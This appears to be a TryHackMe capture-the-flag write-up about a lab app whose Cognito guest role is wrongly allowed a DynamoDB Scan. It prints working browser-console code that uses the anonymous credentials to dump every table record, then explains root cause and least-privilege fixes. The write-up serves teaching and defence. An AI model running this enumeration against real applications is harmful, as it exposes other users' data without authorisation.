---
title: "Complimentary thm — TryHackMe Writeup"
date: 2026-07-30
layout: post
categories: [ctf, tryhackme]
tags: [ctf, cybersecurity, aws, cognito, dynamodb, iam, cloud-security, web-exploitation]
image:
  path: /assets/img/complimentary-banner.png
  alt: Complimentary THM Writeup
---

# Byte Lotus Wellness – Cognito Guest Credentials & DynamoDB IAM Misconfiguration

## Overview

During this challenge, I encountered a web application called **Byte Lotus Wellness**. The application was designed to allow anonymous visitors to view their wellness profile without creating an account. Instead of traditional authentication, it relied on **AWS Cognito Identity Pools** to provide temporary guest credentials.

At first glance, the application appeared to retrieve only the current visitor's profile from a DynamoDB table. However, further analysis revealed that the guest IAM role had been granted broader permissions than intended, allowing complete enumeration of the table.

---

## Initial Reconnaissance

Inspecting the client-side JavaScript revealed several interesting details:

```javascript
const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION = "us-east-1";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";
```

The application initialized AWS Cognito guest credentials directly in the browser:

```javascript
AWS.config.credentials = new AWS.CognitoIdentityCredentials({
    IdentityPoolId: IDENTITY_POOL_ID,
});
```

The dashboard loaded profile information using DynamoDB's `GetItem` operation:

```javascript
dynamodb.getItem({
    TableName: TABLE_NAME,
    Key: {
        guest_id: {
            S: guestId()
        }
    }
});
```

A guest identifier was generated locally and stored in the browser's Local Storage.

```javascript
guest-xxxxxxxx
```

Initially, it appeared that each visitor could only access their own record.

---

## Inspecting Guest Credentials

Opening the browser developer console exposed the temporary Cognito credentials.

```javascript
AWS.config.credentials
```

The object contained:

* Access Key ID
* Secret Access Key
* Session Token
* Identity ID
* Expiration Time

This confirmed that every anonymous visitor received temporary AWS credentials.

---

## Looking Beyond the Frontend

The frontend used `GetItem`, but that does **not** necessarily mean the IAM policy only allows `GetItem`.

Since the AWS SDK exposes multiple DynamoDB APIs, I decided to determine whether the guest role possessed additional permissions.

The most interesting candidate was:

```javascript
dynamodb.scan()
```

Unlike `GetItem`, which requires an exact primary key, `Scan` iterates through every item in a DynamoDB table.

---

## Enumerating the Table

Executing the following code from the browser console successfully returned every record stored in the table.

```javascript
AWS.config.credentials.get(function (err) {
    if (err) {
        console.error(err);
        return;
    }

    const dynamodb = new AWS.DynamoDB({
        region: "us-east-1"
    });

    dynamodb.scan({
        TableName: "complimentary-GuestWellnessProfiles"
    }, function (err, data) {
        if (err) {
            console.error(err);
            return;
        }

        console.log(data);
    });
});
```

The response contained all items rather than only the current guest profile.

Among the returned records was the challenge flag.

---

## Root Cause

The application assumed that users would only invoke the client-side `GetItem` request.

However, authorization decisions in AWS are controlled by **IAM**, not by JavaScript.

The anonymous Cognito role had permission to perform a DynamoDB `Scan` operation, allowing any visitor to enumerate the table.

This resulted in a classic case of **overly permissive IAM permissions**.

---

## Impact

Granting anonymous users the ability to perform `Scan` effectively bypasses the application's intended access model.

Potential consequences include:

* Disclosure of every record in the table
* Exposure of confidential user information
* Enumeration of internal identifiers
* Leakage of sensitive application data
* Complete loss of data confidentiality

In this challenge, it directly exposed the hidden flag.

---

## Mitigation

A secure implementation should follow the principle of least privilege.

Recommended improvements include:

* Grant only the minimum DynamoDB permissions required.
* Avoid allowing anonymous users to perform `Scan`.
* Restrict access using IAM conditions tied to the caller's identity.
* Move sensitive database operations to a backend API instead of exposing DynamoDB directly to clients.
* Validate authorization server-side instead of relying on frontend logic.

---

## Lessons Learned

This challenge demonstrates an important cloud security principle:

> Client-side JavaScript does **not** define security boundaries.

Even though the application only called `GetItem`, the underlying IAM policy ultimately determined what operations were permitted.

Whenever AWS credentials are exposed to the client, it is essential to verify the permissions attached to those credentials. A single overly permissive action such as `dynamodb:Scan` can completely undermine the application's intended authorization model.

---

## Conclusion

This challenge highlighted how seemingly harmless guest credentials can become a serious security issue when paired with an overly permissive IAM policy.

The frontend appeared secure because it only retrieved a single record, yet the guest role itself was capable of enumerating the entire DynamoDB table. This reinforces a fundamental cloud security lesson: **authorization must always be enforced through properly scoped IAM policies, not through assumptions made in client-side code.**
